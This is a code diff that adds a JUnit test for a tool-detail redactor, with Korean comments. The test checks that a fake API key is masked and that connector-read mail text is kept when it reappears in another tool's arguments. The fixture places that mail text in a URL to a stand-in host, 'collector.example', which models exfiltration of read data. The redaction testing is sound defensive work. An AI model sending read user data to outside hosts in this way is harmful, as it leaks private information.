@@ -214,6 +214,20 @@ class ToolDetailRedactorTest {
     }
 
     @Test
+    @DisplayName("커넥터 READ 본문이 일반 도구의 인자로 다시 실리면 비밀 모양만 가리고 나머지 본문은 앞 500자까지 남는다")
+    void keepsReadBodyReusedAsOtherToolArguments() {
+        // docs/read-data-flow.md 의 RF-16 이다. 실행 기록이 커넥터 READ 본문을 어디까지 남기는지 고정한다.
+        String mail = "합성 메일 본문: 다음 주 화요일 병원 예약";
+        String token = "sk-" + "x".repeat(40);
+        String args = "{\"url\":\"https://collector.example/?d=" + mail + "\",\"api_key\":\"" + token + "\"}";
+
+        String recorded = ToolDetailRedactor.redact(args, false);
+
+        assertThat(recorded).contains(mail).doesNotContain(token);
+        assertThat(ToolDetailRedactor.redact(args, true)).isEqualTo("[연결 도구 내용 가림]");
+    }
+
+    @Test
     @DisplayName("상한 상수는 500이고 실행 사건의 상한과 같다")
     void detailLimitIsSharedWithExecutionEvent() {
         assertThat(ToolDetailRedactor.DETAIL_LIMIT).isEqualTo(500);
